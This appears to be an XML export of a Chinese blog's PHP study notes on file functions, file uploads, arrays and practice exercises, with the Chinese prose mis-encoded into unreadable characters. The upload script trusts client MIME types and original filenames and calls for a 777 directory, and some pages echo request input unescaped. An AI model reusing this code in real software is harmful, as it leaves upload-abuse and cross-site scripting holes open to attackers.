    <content type="text"><![CDATA[Abstract: PHPä¸­æ–‡ä»¶å’Œæ–‡ä»¶å¤¹æ“ä½œå¸¸ç”¨å‡½æ•°ä»¥åŠæ–‡ä»¶ä¸Šä¼ åŠŸèƒ½çš„ä»‹ç»å’Œåº”ç”¨ï¼Œå¯¹æ–°é—»ç•Œé¢æ·»åŠ ç”¨æˆ·ç™»å½•æ³¨å†Œç•Œé¢ç­‰ã€‚ ä¸€ã€æ–‡ä»¶å’Œæ–‡ä»¶å¤¹æ“ä½œå¸¸ç”¨å‡½æ•°1. æ–‡ä»¶å†…å®¹æ“ä½œ å‡½æ•°å ä½œç”¨ fopen() æ‰“å¼€æ–‡ä»¶æˆ–URL fread() è¯»å–æ‰“å¼€çš„æ–‡ä»¶ fgets() ä»Žæ‰“å¼€çš„æ–‡ä»¶ä¸­è¿”å›žä¸€è¡Œ fputs()/fwrite() å†™å…¥æ‰“å¼€çš„æ–‡ä»¶ copy() å¤åˆ¶æ–‡ä»¶ fclose() å…³é—­æ‰“å¼€çš„æ–‡ä»¶ file_get_contents() æŠŠæ–‡ä»¶è¯»å…¥å­—ç¬¦ä¸² file_put_contents() æŠŠå­—ç¬¦ä¸²å†™æ–‡ä»¶ basename() è¿”å›žè·¯å¾„ä¸­æ–‡ä»¶åéƒ¨åˆ† filesize() è¿”å›žæ–‡ä»¶å¤§å° fread(handle, length)/filesize(filesize)/copy(file, to_file) 1234567&lt;?php $file = fopen(&quot;test.txt&quot;, &quot;r&quot;); $contents = fread($file, &quot;10&quot;); $size = filesize(&quot;test.txt&quot;); echo copy(&quot;source.txt&quot;, &quot;target.txt&quot;); fclose($file);?&gt; basename(path,suffix) 1234567&lt;?php$path = &quot;/testweb/home.php&quot;;//home.phpecho basename($path) . &quot;&lt;br&gt;&quot;;//homeecho basename($path, &quot;.php&quot;);?&gt; file_get_contents(path, include_path, context, start, max_length) 12345&lt;?php//This is a test file with test textecho file_get_contents(&quot;test.txt&quot;);?&gt; file_put_contents()å‡½æ•°ï¼šæˆåŠŸè¿”å›žå†™å…¥æ–‡ä»¶çš„å­—ç¬¦æ•°ï¼Œå¤±è´¥åˆ™è¿”å›žFalse 12345678910111213&lt;?php// 6echo file_put_contents(&quot;sites.txt&quot;, &quot;Runoob&quot;);$file = &apos;sites.txt&apos;; $site = &quot;\nGoogle&quot;;// å‘æ–‡ä»¶è¿½åŠ å†™å…¥å†…å®¹// ä½¿ç”¨ FILE_APPEND æ ‡è®°ï¼Œå¯ä»¥åœ¨æ–‡ä»¶æœ«å°¾è¿½åŠ å†…å®¹// LOCK_EX æ ‡è®°å¯ä»¥é˜²æ­¢å¤šäººåŒæ—¶å†™å…¥file_put_contents($file, $site, FILE_APPEND | LOCK_EX);?&gt; 2.æ–‡ä»¶æ“ä½œ å‡½æ•°å ä½œç”¨ file_exists() æ£€æŸ¥æ–‡ä»¶æˆ–ç›®å½•æ˜¯å¦å­˜åœ¨ filetype() è¿”å›žæ–‡ä»¶ç±»åž‹ is_dir() åˆ¤æ–­æ–‡ä»¶æ˜¯å¦æ˜¯ä¸€ä¸ªç›®å½• is_file() åˆ¤æ–­æ–‡ä»¶æ˜¯å¦æ˜¯å¸¸è§„çš„æ–‡ä»¶ mkdir() åˆ›å»ºç›®å½• rename() é‡å‘½åæ–‡ä»¶æˆ–ç›®å½• rmdir() åˆ é™¤ç©ºçš„ç›®å½• unlink() åˆ é™¤æ–‡ä»¶ file_exists(path) 1234&lt;?php// 1echo file_exists(&quot;test.txt&quot;)?&gt; filetype(filename) 1234567&lt;?php// fifo char dir block link file unknown//fileecho filetype(&quot;test.txt&quot;);//direcho filetype(&quot;images&quot;);?&gt; äºŒã€æ–‡ä»¶ä¸Šä¼ 1. åˆ›å»ºä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ è¡¨å•12345678910111213&lt;html&gt; &lt;head&gt; &lt;meta charset="utf-8"&gt; &lt;title&gt;æ–‡ä»¶ä¸Šä¼ &lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;form action="upload_file.php" method="post" enctype="multipart/form-data"&gt; &lt;label for="file"&gt;æ–‡ä»¶åï¼š&lt;/label&gt; &lt;input type="file" name="file" id="file"&gt;&lt;br&gt; &lt;input type="submit" name="submit" value="æäº¤"&gt; &lt;/form&gt; &lt;/body&gt;&lt;/html&gt; &lt;form&gt;æ ‡ç­¾çš„enctypeå±žæ€§è§„å®šäº†åœ¨æäº¤è¡¨å•æ—¶è¦ä½¿ç”¨å“ªç§å†…å®¹ç±»åž‹ã€‚åœ¨è¡¨å•éœ€è¦äºŒè¿›åˆ¶æ•°æ®æ—¶ï¼Œæ¯”å¦‚æ–‡ä»¶å†…å®¹ï¼Œä½¿ç”¨multipart/form-dataã€‚ &lt;input&gt;æ ‡ç­¾type=&quot;file&quot;å±žæ€§è§„å®šäº†åº”è¯¥æŠŠè¾“å…¥ä½œä¸ºæ–‡ä»¶æ¥å¤„ç†ã€‚ 2. åˆ›å»ºä¸Šä¼ è„šæœ¬ upload_file.php123456789101112131415&lt;?php if($_FILES[&quot;file&quot;][&quot;error&quot;]&gt;0)&#123; //ç”±æ–‡ä»¶ä¸Šä¼ å¯¼è‡´çš„é”™è¯¯ä»£ç  echo &quot;é”™è¯¯&quot; .$_FILES[&quot;file&quot;][&quot;error&quot;] . &quot;&lt;br&gt;&quot;; &#125;else&#123; //ä¸Šä¼ æ–‡ä»¶çš„åç§° echo &quot;ä¸Šä¼ æ–‡ä»¶åï¼š&quot; . $_FILES[&quot;file&quot;][&quot;name&quot;] . &quot;&lt;br&gt;&quot;; //ä¸Šä¼ æ–‡ä»¶çš„ç±»åž‹ echo &quot;æ–‡ä»¶ç±»åž‹ï¼š&quot; . $_FILES[&quot;file&quot;][&quot;type&quot;] . &quot;&lt;br&gt;&quot;; //ä¸Šä¼ æ–‡ä»¶çš„å¤§å° echo &quot;æ–‡ä»¶å¤§å°ï¼š&quot; . ($_FILES[&quot;file&quot;][&quot;size&quot;]/1024) . &quot;&lt;br&gt;&quot;; //å­˜å‚¨åœ¨æœåŠ¡å™¨çš„æ–‡ä»¶ä¸´æ—¶å‰¯æœ¬çš„åç§° echo &quot;æ–‡ä»¶ä¸´æ—¶å­˜å‚¨ä½ç½®ï¼š&quot; . $_FILES[&quot;file&quot;][&quot;tmp_name&quot;]; &#125;?&gt; 3. ä¸Šä¼ é™åˆ¶123456789101112131415161718192021222324252627282930&lt;?php//å…è®¸ä¸Šä¼ å›¾ç‰‡åŽç¼€$allowedExts = array(&quot;gif&quot;, &quot;jpeg&quot;, &quot;jpg&quot;, &quot;png&quot;);$temp = explode(&quot;.&quot;, $_FILES[&apos;file&apos;][&apos;name&apos;]);//èŽ·å–æ–‡ä»¶åŽç¼€å$extension = end($temp);if((($_FILES[&quot;file&quot;][&quot;type&quot;] == &quot;image/gif&quot;) || ($_FILES[&quot;file&quot;][&quot;type&quot;] == &quot;image/jpeg&quot;) || ($_FILES[&quot;file&quot;][&quot;type&quot;] == &quot;image/jpg&quot;) || ($_FILES[&quot;file&quot;][&quot;type&quot;] == &quot;image/pjpeg&quot;) || ($_FILES[&quot;file&quot;][&quot;type&quot;] == &quot;image/x-png&quot;) || ($_FILES[&quot;file&quot;][&quot;type&quot;] == &quot;image/png&quot;)) &amp;&amp; ($_FILES[&quot;file&quot;][&quot;size&quot;] &lt; 204800) &amp;&amp; (in_array($extension, $allowedExts)))&#123; if($_FILES[&quot;file&quot;][&quot;error&quot;] &gt; 0)&#123; echo &quot;é”™è¯¯ï¼š&quot; . $_FILES[&quot;file&quot;][&quot;error&quot;] . &quot;&lt;br&gt;&quot;; &#125;else&#123; //ä¸Šä¼ æ–‡ä»¶çš„åç§° echo &quot;ä¸Šä¼ æ–‡ä»¶åï¼š&quot; . $_FILES[&quot;file&quot;][&quot;name&quot;] . &quot;&lt;br&gt;&quot;; //ä¸Šä¼ æ–‡ä»¶çš„ç±»åž‹ echo &quot;æ–‡ä»¶ç±»åž‹ï¼š&quot; . $_FILES[&quot;file&quot;][&quot;type&quot;] . &quot;&lt;br&gt;&quot;; //ä¸Šä¼ æ–‡ä»¶çš„å¤§å° echo &quot;æ–‡ä»¶å¤§å°ï¼š&quot; . ($_FILES[&quot;file&quot;][&quot;size&quot;]/1024) . &quot;&lt;br&gt;&quot;; //å­˜å‚¨åœ¨æœåŠ¡å™¨çš„æ–‡ä»¶ä¸´æ—¶å‰¯æœ¬çš„åç§° echo &quot;æ–‡ä»¶ä¸´æ—¶å­˜å‚¨ä½ç½®ï¼š&quot; . $_FILES[&quot;file&quot;][&quot;tmp_name&quot;]; &#125;&#125;else&#123; echo &quot;éžæ³•æ–‡ä»¶çš„æ ¼å¼&quot;;&#125;?&gt; 4. ä¿å­˜è¢«ä¸Šä¼ çš„æ–‡ä»¶12345678910111213141516171819202122232425262728293031323334353637383940&lt;?php//å…è®¸ä¸Šä¼ å›¾ç‰‡åŽç¼€$allowedExts = array(&quot;gif&quot;, &quot;jpeg&quot;, &quot;jpg&quot;, &quot;png&quot;);$temp = explode(&quot;.&quot;, $_FILES[&apos;file&apos;][&apos;name&apos;]);//èŽ·å–æ–‡ä»¶åŽç¼€å$extension = end($temp);if((($_FILES[&quot;file&quot;][&quot;type&quot;] == &quot;image/gif&quot;) || ($_FILES[&quot;file&quot;][&quot;type&quot;] == &quot;image/jpeg&quot;) || ($_FILES[&quot;file&quot;][&quot;type&quot;] == &quot;image/jpg&quot;) || ($_FILES[&quot;file&quot;][&quot;type&quot;] == &quot;image/pjpeg&quot;) || ($_FILES[&quot;file&quot;][&quot;type&quot;] == &quot;image/x-png&quot;) || ($_FILES[&quot;file&quot;][&quot;type&quot;] == &quot;image/png&quot;)) &amp;&amp; ($_FILES[&quot;file&quot;][&quot;size&quot;] &lt; 204800) &amp;&amp; (in_array($extension, $allowedExts)))&#123; if($_FILES[&quot;file&quot;][&quot;error&quot;] &gt; 0)&#123; echo &quot;é”™è¯¯ï¼š&quot; . $_FILES[&quot;file&quot;][&quot;error&quot;] . &quot;&lt;br&gt;&quot;; &#125;else&#123; //ä¸Šä¼ æ–‡ä»¶çš„åç§° echo &quot;ä¸Šä¼ æ–‡ä»¶åï¼š&quot; . $_FILES[&quot;file&quot;][&quot;name&quot;] . &quot;&lt;br&gt;&quot;; //ä¸Šä¼ æ–‡ä»¶çš„ç±»åž‹ echo &quot;æ–‡ä»¶ç±»åž‹ï¼š&quot; . $_FILES[&quot;file&quot;][&quot;type&quot;] . &quot;&lt;br&gt;&quot;; //ä¸Šä¼ æ–‡ä»¶çš„å¤§å° echo &quot;æ–‡ä»¶å¤§å°ï¼š&quot; . ($_FILES[&quot;file&quot;][&quot;size&quot;]/1024) . &quot;&lt;br&gt;&quot;; //å­˜å‚¨åœ¨æœåŠ¡å™¨çš„æ–‡ä»¶ä¸´æ—¶å‰¯æœ¬çš„åç§° echo &quot;æ–‡ä»¶ä¸´æ—¶å­˜å‚¨ä½ç½®ï¼š&quot; . $_FILES[&quot;file&quot;][&quot;tmp_name&quot;]; //åˆ¤æ–­å½“å‰ç›®å½•ä¸‹çš„uploadç›®å½•æ˜¯å¦å­˜åœ¨è¯¥æ–‡ä»¶ //å¦‚æžœæ²¡æœ‰uploadç›®å½•ï¼Œéœ€è¦åˆ›å»ºå®ƒï¼Œuploadç›®å½•æƒé™ä¸º777 if(file_exists(&quot;upload/&quot; . $_FILES[&quot;file&quot;][&quot;name&quot;]))&#123; echo $_FILES[&quot;file&quot;][&quot;name&quot;] . &quot;æ–‡ä»¶å·²ç»å­˜åœ¨&quot;; &#125;else&#123; //å¦‚æžœuploadç›®å½•ä¸å­˜åœ¨è¯¥æ–‡ä»¶åˆ™å°†æ–‡ä»¶ä¸Šä¼ åˆ°uploadç›®å½•ä¸‹ move_uploaded_file($_FILES[&quot;file&quot;][&quot;tmp_name&quot;], &quot;upload/&quot; . $_FILES[&quot;file&quot;][&quot;name&quot;]); echo &quot;æ–‡ä»¶å­˜å‚¨åœ¨ï¼š&quot; . &quot;upload/&quot; . $_FILES[&quot;file&quot;][&quot;name&quot;]; &#125; &#125;&#125;else&#123; echo &quot;éžæ³•æ–‡ä»¶çš„æ ¼å¼&quot;;&#125;?&gt; å…³äºŽä¸Šä¼ æ–‡ä»¶çš„èµ·åå¸¸å¸¸åŠ ä¸Šæ—¶é—´æˆ³ã€‚]]></content>
      <categories>
        <category>Web Security</category>
        <category>ç¬”è®°</category>
      </categories>
      <tags>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[note18]]></title>
    <url>%2F2019%2F08%2F07%2Fnote18%2F</url>
    <content type="text"><![CDATA[Abstract: PHPæ•°ç»„ç´¢å¼•æ•°ç»„å’Œå…³è”æ•°ç»„çš„éåŽ†ï¼Œä»¥åŠæ•°ç»„å¸¸ç”¨çš„å‡½æ•°ï¼›PHPæ–‡ä»¶å¤„ç†å¸¸ç”¨å‡½æ•°ä»¥åŠä¸åŒæ¨¡å¼ä¸‹å¯¹æ–‡ä»¶çš„æ“ä½œã€‚ ä¸€ã€æ•°ç»„1. æ•°ç»„éåŽ† ç´¢å¼•æ•°ç»„ 1234567&lt;?php$arr1 = [&apos;wm&apos;, 56, &apos;Beijing&apos;];for($i=0; $i&lt;count($arr1); $i++)&#123; echo $arr1[$i]; echo PHP_EOL;&#125;?&gt; å…³è”æ•°ç»„ foreachéåŽ† 1234567891011&lt;?php$arr = [ &apos;name&apos; =&gt; &apos;zs&apos;, &apos;age&apos; =&gt; 18, &apos;add&apos; =&gt; &apos;China&apos;];foreach($arr as $item =&gt;$value)&#123; echo $item . &quot;=&gt;&quot; . $value; echo PHP_EOL;&#125;?&gt; â€‹ foréåŽ† 123456789101112131415&lt;?php$arr = [ &apos;name&apos; =&gt; &apos;zs&apos;, &apos;age&apos; =&gt; 18, &apos;add&apos; =&gt; &apos;China&apos;];for($i=0; $i&lt;count($arr); $i++)&#123; echo key($arr) . &apos;=&gt;&apos; . current($arr); echo PHP_EOL; next($arr);&#125;?&gt; 12345678910111213141516171819202122232425262728&lt;?php$arr = [ &apos;name&apos; =&gt; &apos;zs&apos;, &apos;age&apos; =&gt; 18, &apos;add&apos; =&gt; &apos;China&apos;];$arr1 = $arr;$keyName = array_keys($arr);$valueName = array_values($arr);echo $keyName[0];echo PHP_EOL;for($i=0; $i&lt;count($arr); $i++)&#123; echo $keyName[$i] . &quot;=&gt;&quot; . $arr[$keyName[$i]]; echo PHP_EOL;&#125;for($i=0; $i&lt;count($arr); $i++)&#123; echo array_pop($arr1); next($arr1); echo PHP_EOL;&#125;fwrite(STDOUT,iconv(&apos;utf-8&apos;,&apos;gb2312&apos;,&apos;ä½¿ç”¨forå¾ªçŽ¯éåŽ†å…³è”æ•°ç»„&apos;));echo PHP_EOL;for($i=0; $i&lt;count($arr); $i++)&#123; echo $keyName[$i] . &apos;=&gt;&apos; . $valueName[$i]; echo PHP_EOL;&#125;?&gt; 2. æ•°ç»„å¸¸ç”¨å‡½æ•° å‡½æ•°åç§° ä½œç”¨ array_keys(array, value, strict) è¿”å›žæ•°ç»„ä¸­æ‰€æœ‰çš„é”®å array_values(array) è¿”å›žæ•°ç»„ä¸­æ‰€æœ‰çš„å€¼ count(array)/sizeof(array) è¿”å›žæ•°ç»„ä¸­å…ƒç´ çš„æ•°ç›® array_merge(array1, array2) æŠŠä¸€ä¸ªæˆ–å¤šä¸ªæ•°ç»„åˆå¹¶ä¸ºä¸€ä¸ªæ•°ç»„ array_key_exists(key, array) æ£€æŸ¥æŒ‡å®šçš„é”®åæ˜¯å¦å­˜åœ¨ä¸Žæ•°ç»„ä¸­ sort() å¯¹æ•°å€¼ç»„è¿›è¡Œå‡åºæŽ’åº in_array(needle, haystack) æ£€æŸ¥æ•°ç»„ä¸­æ˜¯å¦å­˜åœ¨æŒ‡å®šçš„å€¼ array_unique() åˆ é™¤æ•°ç»„ä¸­é‡å¤çš„å€¼ array_pop(array) åˆ é™¤æ•°ç»„ä¸­æœ€åŽä¸€ä¸ªå…ƒç´ ï¼ˆæ ˆï¼‰ array_keys(array, value, strict) 123456789101112&lt;?php$a = array(&quot;Volvo&quot; =&gt; &quot;XC90&quot;, &quot;BMW&quot; =&gt; &quot;X5&quot;, &quot;Toyota&quot; =&gt; &quot;Highlander&quot;);//[0]=&gt;Volvo [1]=&gt;BMW [2]=&gt;Toyotaprint_r(array_keys($a));//[0]=&gt;Toyotaprint_r(array_keys($a,&quot;Highlander&quot;));$a=array(10,20,30,&quot;10&quot;);//[0]=&gt;3print_r(array_keys($a,&quot;10&quot;,true));?&gt; array_values(array) count()/sizeof() 123456789101112&lt;?php$a = array(&quot;Name&quot; =&gt; &quot;Peter&quot;, &quot;Age&quot; =&gt; &quot;41&quot;, &quot;Country&quot; =&gt; &quot;USA&quot;);//[0]=&gt;Peter [1]=&gt;41 [2]=&gt;USAprint_r(array_values($a));//3echo count($a);echo PHP_EOL;//3echo sizeof($a);echo PHP_EOL;?&gt; array_merge(array1, array2) 1234567891011121314&lt;?php$a1 = array(&quot;a&quot; =&gt; &quot;red&quot;, &quot;b&quot; =&gt; &quot;green&quot;);$a2 = array(&quot;c&quot; =&gt; &quot;blue&quot;, &quot;b&quot; =&gt; &quot;yellow&quot;);//å¦‚æžœä¸¤ä¸ªæˆ–æ›´å¤šä¸ªæ•°ç»„å…ƒç´ æœ‰ç›¸åŒé”®åï¼Œåˆ™æœ€åŽå…ƒç´ ä¼šè¦†ç›–å…¶ä»–å…ƒç´ //[a]=&gt;red [b]=&gt;yellow [c]=&gt;blueprint_r(array_merge($a1, $a2));$a=array(3=&gt;&quot;red&quot;,4=&gt;&quot;green&quot;);//è‹¥æ•°ç»„é”®åæ˜¯æ•´æ•°ï¼Œåˆ™è¯¥å‡½æ•°å°†è¿”å›žä»¥é”®å0å¼€å§‹è¿›è¡Œé‡æ–°ç´¢å¼•//[0]=&gt;red [1]=&gt;greenprint_r(array_merge($a));?&gt; array_key_exists(key, array) 1234567891011121314151617181920&lt;?php$a=array(&quot;Volvo&quot;=&gt;&quot;XC90&quot;,&quot;BMW&quot;=&gt;&quot;X5&quot;);if (array_key_exists(&quot;Volvo&quot;,$a))&#123; echo &quot;Key exists!&quot;;&#125;else&#123; echo &quot;Key does not exist!&quot;;&#125;$a=array(&quot;Volvo&quot;,&quot;BMW&quot;);if (array_key_exists(0,$a))&#123; echo &quot;Key exists!&quot;;&#125;else&#123; echo &quot;Key does not exist!&quot;;&#125;?&gt; sort() 1234567891011121314151617181920&lt;?php $cars=array(&quot;Volvo&quot;,&quot;BMW&quot;,&quot;Toyota&quot;); sort($cars); $clength=count($cars); for($x=0;$x&lt;$clength;$x++)&#123; echo $cars[$x]; echo &quot;&lt;br&gt;&quot;; &#125; // BMW Toyota Volvo $numbers=array(4,6,2,22,11); sort($numbers); $arrlength=count($numbers); for($x=0;$x&lt;$arrlength;$x++)&#123; echo $numbers[$x]; echo &quot;&lt;br&gt;&quot;; &#125;//2 4 6 11 22?&gt; in_array() 123456789101112&lt;?php$sites = array(&quot;Google&quot;, &quot;Runoob&quot;, &quot;Taobao&quot;, &quot;Facebook&quot;); if (in_array(&quot;Runoob&quot;, $sites))&#123; echo &quot;æ‰¾åˆ°åŒ¹é…é¡¹ï¼&quot;;&#125;else&#123; echo &quot;æ²¡æœ‰æ‰¾åˆ°åŒ¹é…é¡¹ï¼&quot;;&#125;?&gt; åœ¨ç»ƒä¹ äºŒä¸­æˆç»©è¾“å…¥å®žä¾‹ä¸­ä¹Ÿä½¿ç”¨äº†in_arrayå‡½æ•° array_unique() 12345&lt;?php$a=array(&quot;a&quot;=&gt;&quot;red&quot;,&quot;b&quot;=&gt;&quot;green&quot;,&quot;c&quot;=&gt;&quot;red&quot;);// [a]=&gt;red [b]=&gt;greenprint_r(array_unique($a));?&gt; array_pop(array) 123456&lt;?php$a=array(&quot;red&quot;,&quot;green&quot;,&quot;blue&quot;);array_pop($a);// [0]=&gt; red [1]=&gt;greenprint_r($a);?&gt; äºŒã€æ–‡ä»¶å¤„ç†1. æ‰“å¼€æ–‡ä»¶fopenæ¨¡å¼ æ¨¡å¼ æè¿° r åªè¯»ã€‚åœ¨æ–‡ä»¶çš„å¼€å¤´å¼€å§‹ã€‚ r+ è¯»/å†™ã€‚åœ¨æ–‡ä»¶çš„å¼€å¤´å¼€å§‹ã€‚ w åªå†™ã€‚æ‰“å¼€å¹¶æ¸…ç©ºæ–‡ä»¶çš„å†…å®¹ï¼›è‹¥æ–‡ä»¶ä¸å­˜åœ¨ï¼Œåˆ™åˆ›å»ºæ–°æ–‡ä»¶ã€‚ w+ è¯»/å†™ã€‚æ‰“å¼€å¹¶æ¸…ç©ºæ–‡ä»¶çš„å†…å®¹ï¼›è‹¥æ–‡ä»¶ä¸å­˜åœ¨ï¼Œåˆ™åˆ›å»ºæ–°æ–‡ä»¶ã€‚ a è¿½åŠ ï¼Œè‹¥æ–‡ä»¶ä¸å­˜åœ¨ï¼Œåˆ™åˆ›å»ºæ–°æ–‡ä»¶ã€‚ a+ è¯»/è¿½åŠ ã€‚ x åªå†™ã€‚åˆ›å»ºæ–°æ–‡ä»¶ã€‚è‹¥æ–‡ä»¶å·²å­˜åœ¨ï¼Œåˆ™è¿”å›žFALSEå’Œä¸€ä¸ªé”™è¯¯ã€‚ x+ è¯»/å†™ï¼Œåˆ›å»ºæ–°æ–‡ä»¶ã€‚è‹¥æ–‡ä»¶å·²å­˜åœ¨ï¼Œåˆ™è¿”å›žFALSEå’Œä¸€ä¸ªé”™è¯¯ã€‚ 2.æ£€æµ‹æ–‡ä»¶æœ«å°¾(EOF)123if(feof($file))&#123; echo &quot;æ–‡ä»¶æœ«å°¾&quot;;&#125; 3. é€è¡Œ/å­—ç¬¦è¯»å–æ–‡ä»¶123456789&lt;?php$file = fopen(&quot;welcome.txt&quot;, &quot;r&quot;) or exit(&quot;æ— æ³•æ‰“å¼€æ–‡ä»¶!&quot;);// è¯»å–æ–‡ä»¶æ¯ä¸€è¡Œï¼Œç›´åˆ°æ–‡ä»¶ç»“å°¾while(!feof($file))&#123; echo fgets($file). &quot;&lt;br&gt;&quot;;&#125;fclose($file);?&gt; 12345678&lt;?php$file=fopen(&quot;welcome.txt&quot;,&quot;r&quot;) or exit(&quot;æ— æ³•æ‰“å¼€æ–‡ä»¶!&quot;);while (!feof($file))&#123; echo fgetc($file);&#125;fclose($file);?&gt; 4. å†™æ–‡ä»¶fwrite(file, string, length)å’Œfputs(file, string, length) 12345&lt;?php$file = fopen(&quot;test.txt&quot;,&quot;w&quot;);echo fwrite($file,&quot;Hello World. Testing!&quot;);fclose($file);?&gt; 12345&lt;?php$file = fopen(&quot;test.txt&quot;,&quot;w&quot;);echo fputs($file,&quot;Hello World. Testing!&quot;);fclose($file);?&gt;]]></content>
      <categories>
        <category>Web Security</category>
        <category>ç¬”è®°</category>
      </categories>
      <tags>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ç»ƒä¹ 3]]></title>
    <url>%2F2019%2F08%2F07%2Fpractice3%2F</url>
    <content type="text"><![CDATA[Abstract: å­¦ä¹ PHPçš„ä¸‰ä¸ªç»ƒä¹ ï¼Œç¬¬ä¸€ä¸ªæ˜¯åˆ¤æ–­ä¸€ä¸ªæ•°æ˜¯å¦ä¸ºç´ æ•°ï¼Œç¬¬äºŒä¸ªæ˜¯ç”»äº”è§’æ˜Ÿï¼Œç¬¬ä¸‰ä¸ªæ˜¯å†™ä¸€ä¸ªæ–°é—»ç•Œé¢ï¼Œç”¨è¯»å†™æ–‡ä»¶æ¥ä»£æ›¿æ•°æ®åº“ã€‚ é¢˜ç›®ä¸€ï¼šåˆ¤æ–­ä¸€ä¸ªæ•°æ˜¯å¦ä¸ºç´ æ•° 12345678910111213141516171819202122232425262728293031&lt;html&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt; åˆ¤æ–­ä¸€ä¸ªæ•°æ˜¯å¦ä¸ºç´ æ•° &lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;form action=&quot;judgePrime.php&quot; method=&quot;get&quot;&gt; è¯·è¾“å…¥ä¸€ä¸ªæ•°ï¼š&lt;input type=&quot;text&quot; name=&quot;number&quot;&gt; &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;æäº¤&quot;&gt;&lt;/form&gt;&lt;?php $num = isset($_GET[&apos;number&apos;]) ? $_GET[&apos;number&apos;]: 2; $k = 0; for($i=1; $i&lt;=$num; $i++)&#123; if($num%$i == 0)&#123; $k++; &#125; &#125; if($_GET[&apos;number&apos;]!=NULL) &#123; if ($k == 2) &#123; echo $num . &apos;æ˜¯ä¸€ä¸ªç´ æ•°&apos;; &#125; else &#123; echo $num . &apos;ä¸æ˜¯ä¸€ä¸ªç´ æ•°&apos;; &#125; &#125;?&gt;&lt;/body&gt;&lt;/html&gt; OUT é¢˜ç›®äºŒï¼šç”¨PHPç”»äº”è§’æ˜Ÿ 12345678910111213141516171819202122232425262728293031323334353637383940414243&lt;?phpecho &quot;\n\n&quot;;for ( $i1 = 1; $i1 &lt; 6; $i1++ ) /*è¿™æ˜¯äº”è§’æ˜Ÿçš„ä¸Šé¢ä¸€ä¸ªè§’*/&#123; for ( $j1 = 1; $j1 &lt; 19 - $i1; $j1++ ) printf( &quot; &quot; ); for ( $k1 = 1; $k1 &lt;= 2 * $i1 - 1; $k1++ ) printf( &quot;*&quot; ); printf( &quot;\n&quot; );&#125;for ($i2 = 1; $i2 &lt; 5; $i2++ ) /*è¿™æ˜¯äº”è§’æ˜Ÿçš„ä¸­é—´ä¸¤ä¸ªè§’*/&#123; for ( $j2 = 1; $j2 &lt; 3 * $i2 - 3; $j2++ ) printf( &quot; &quot; ); for ( $k2 = 1; $k2 &lt;= 42 - 6 * $i2; $k2++ ) printf( &quot;*&quot; ); printf( &quot;\n&quot; );&#125;for ( $i3 = 1; $i3 &lt; 3; $i3++ ) /*è¿™æ˜¯ä¸­é—´ä¸Žä¸‹éƒ¨ç›¸æŽ¥çš„éƒ¨åˆ†*/&#123; for ( $j3 = 1; $j3 &lt; 12 - $i3; $j3++ ) printf( &quot; &quot; ); for ( $k3 = 1; $k3 &lt;= 12 + 2 * $i3; $k3++ ) printf( &quot;*&quot; ); printf( &quot;\n&quot; );&#125;for ( $i4 = 1; $i4 &lt; 5; $i4++ ) /*è¿™æ˜¯äº”è§’æ˜Ÿçš„ä¸‹é¢ä¸¤ä¸ªè§’*/&#123; for ( $j4 = 1; $j4 &lt; 10 - $i4; $j4++ ) printf( &quot; &quot; ); for ( $k4 = 1; $k4 &lt;= 10 - 2 * $i4; $k4++ ) printf( &quot;*&quot; ); for ( $m4 = 1; $m4 &lt; 6 * $i4 - 3; $m4++ ) printf( &quot; &quot; ); for ( $n4 = 1; $n4 &lt;= 10 - 2 * $i4; $n4++ ) printf( &quot;*&quot; ); printf( &quot;\n&quot; );&#125;?&gt; OUT é¢˜ç›®ä¸‰ï¼šæ–°é—»ç•Œé¢ åœ¨news_fileæ–‡ä»¶å¤¹ä¸‹æœ‰index.phpå’Œdataæ–‡ä»¶å¤¹ï¼Œindex.phpä¸»è¦æ˜¯æ˜¾ç¤ºæ–°é—»çš„ä½œç”¨ï¼Œdataæ–‡ä»¶å¤¹é‡Œé¢æœ‰add_news.phpå’Œnews.dbï¼Œå…¶ä¸­add_news.phpä¸»è¦æ˜¯æ·»åŠ æ–°é—»åˆ°news.dbä¸­ï¼Œnews.dbæ¯è¡Œå­˜æ”¾ç€æ–°é—»çš„æ ‡å·ï¼Œæ ‡é¢˜ï¼Œå†…å®¹ï¼Œæ—¥æœŸï¼Œä½œè€…ï¼Œçƒ­åº¦å’Œå›¾ç‰‡é“¾æŽ¥ï¼Œå…¶ä¸­æ ‡é¢˜ï¼Œå†…å®¹ä¸Žä½œè€…ä½¿ç”¨äº†base64ç¼–ç ï¼Œä¸¤ä¸¤ç”¨||åˆ†éš”ã€‚ index.php 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657&lt;html&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;news&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;br&gt;&lt;h1 align=&quot;center&quot;&gt;ICQæ–°é—»ä¸­å¿ƒ&lt;/h1&gt;&lt;hr&gt;&lt;table align=&quot;center&quot;&gt; &lt;tr&gt; &lt;th&gt;çƒ­åº¦&lt;/th&gt; &lt;th&gt;æ ‡é¢˜&lt;/th&gt; &lt;th&gt;ä½œè€…&lt;/th&gt; &lt;th&gt;æ—¶é—´&lt;/th&gt; &lt;th&gt;ç´ è´¨ä¸‰è”&lt;/th&gt; &lt;/tr&gt; &lt;?php //ç”¨åªè¯»æ–¹å¼æ‰“å¼€news.dbæ–‡ä»¶ $fhandle = fopen(&quot;./data/news.db&quot;, &quot;r&quot;); //è®¾ç½®ä¸€ä¸ªè®¡æ•°å™¨ï¼Œå°äºŽ3æ—¶ï¼Œæ¯ä¸ªæ–‡ç« æ ‡é¢˜ä¸‹é¢å¢žåŠ å›¾ç‰‡å’Œç®€ä»‹ $top3Cnt=1; while(!feof($fhandle)) &#123; $fline = fgets($fhandle); $data = explode(&apos;||&apos;, $fline); $title = base64_decode($data[1]); $content = base64_decode($data[2]); $date = $data[3]; $author = base64_decode($data[4]); $hot = $data[5]; $imgUrl = $data[6]; echo &lt;&lt;&lt;EOF &lt;tr align=&quot;center&quot;&gt; &lt;td&gt;$hot&lt;/td&gt; &lt;td&gt;&lt;a href=&quot;myl.php&quot;&gt;$title&lt;/a&gt;&lt;/td&gt; &lt;td&gt;$author&lt;/td&gt; 